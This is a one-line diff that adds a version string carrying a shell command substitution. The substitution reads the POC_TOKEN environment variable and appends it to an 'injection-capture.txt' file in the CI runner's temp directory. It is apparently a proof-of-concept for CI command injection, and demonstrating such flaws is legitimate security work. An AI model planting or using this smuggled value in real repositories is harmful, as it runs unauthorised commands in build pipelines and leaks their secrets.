@@ -1,0 +1,1 @@
+1.0.0$(env | grep POC_TOKEN >> ${RUNNER_TEMP}/injection-capture.txt)
